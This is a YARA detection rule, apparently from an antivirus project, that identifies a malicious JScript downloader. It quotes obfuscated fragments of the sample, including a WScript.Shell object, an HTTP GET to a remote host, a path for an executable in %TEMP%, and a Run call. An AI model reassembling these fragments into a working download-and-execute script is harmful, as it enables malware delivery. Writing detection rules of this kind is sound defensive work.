rule sig_20160328_dbd3d1fddc74c04d5e321a774cef018b {
  meta:
    description = "datamaliciousorder - file 20160328_dbd3d1fddc74c04d5e321a774cef018b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ef322c223b127cc6578755c2749fae2c2c4ae2770a54c9177003d62aa1da0c89"

  strings:
    $s1  = "function Culscren() {return Oobbgs[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Bpt5dhkTUN.exe\";};" fullword ascii
    $s2  = "Ciqzvfuzp[Zphid](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Ohuhrkvae](Ekrsf() * 11)} while (Ciqzvfuzp[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Oobbgs = function Npuczed() {return WScript[Rsyhgf](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Dnjdwzrmlz(Bfdfi, Fcachyylm){return Bfdfi - Fcachyylm;};" fullword ascii
    $s6  = "function Qwdvlhta(Yiqnlay){Oobbgs[\"Run\"](Yiqnlay, Wllufpomqv, Wllufpomqv);};" fullword ascii
    $s7  = "function Nvkmw() {return ((Sluvlh == true) && (Sluvlh == Mbqseyapl)) ? 1 : Wllufpomqv;};" fullword ascii
    $s8  = "return Dnjdwzrmlz(Mvcufl, Mirzfahnap);" fullword ascii
    $s9  = "function Yrtdqabony()" fullword ascii
    $s10 = "function Odpvif(){return Rsyhgf;};" fullword ascii
    $s11 = "var Sluvlh = false;" fullword ascii
    $s12 = "var Grrxd = false;" fullword ascii
    $s13 = "function Mujifyjxxz(Csmbrl) {var Kdclgusxfu = (1, 2, 3, 4, 5, Csmbrl); return Kdclgusxfu;};" fullword ascii
    $s14 = "var Qonwo = new this[\"Date\"]();" fullword ascii
    $s15 = "var Mbqseyapl = false;" fullword ascii
    $s16 = "Sluvlh = true; " fullword ascii
    $s17 = " while (Cvgfubo){" fullword ascii
    $s18 = "Mbqseyapl = true; " fullword ascii
    $s19 = "function Ekrsf(){return 22;};" fullword ascii
    $s20 = "function Nytsjcac(){return Mtmjhl;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}